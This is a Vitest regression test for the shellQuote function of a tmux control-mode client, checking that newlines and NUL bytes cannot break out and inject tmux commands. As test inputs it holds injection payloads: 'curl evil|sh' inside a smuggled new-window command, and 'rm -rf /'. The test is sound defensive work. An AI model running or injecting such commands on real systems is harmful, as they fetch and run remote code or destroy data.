import { describe, it, expect } from 'vitest';
import { shellQuote } from './TmuxClient.js';

// Regression for the tmux command-injection fix. tmux -CC is a
// line-delimited control protocol: a raw \r/\n in phone input used to
// terminate the send-keys line and execute the remainder as tmux
// commands. shellQuote is the defense-in-depth layer (sendInput also
// splits on newlines and sends each line as its own literal).
describe('shellQuote', () => {
  it('single-quotes and escapes embedded single quotes', () => {
    expect(shellQuote("abc")).toBe("'abc'");
    expect(shellQuote("a'b")).toBe("'a'\\''b'");
  });

  it('strips NUL / CR / LF so nothing can break the control line', () => {
    expect(shellQuote('a\nb')).toBe("'ab'");
    expect(shellQuote('a\r\nb')).toBe("'ab'");
    expect(shellQuote('a\x00b')).toBe("'ab'");
    const out = shellQuote("ls\nkill-server\nnew-window 'curl evil|sh'");
    expect(out).not.toMatch(/[\r\n\x00]/);
  });

  it('preserves spaces and ordinary text', () => {
    expect(shellQuote('git push origin main')).toBe("'git push origin main'");
  });

  it('a multi-line payload yields no segment that can break out', () => {
    // This is what sendInput does: split first, then quote each line.
    const payload = "echo hi\nrm -rf /\n";
    for (const seg of payload.split(/\r\n|\r|\n/)) {
      const q = shellQuote(seg);
      expect(q).not.toMatch(/[\r\n]/);          // can't terminate the line
      expect(q.startsWith("'") && q.endsWith("'")).toBe(true);
    }
  });
});
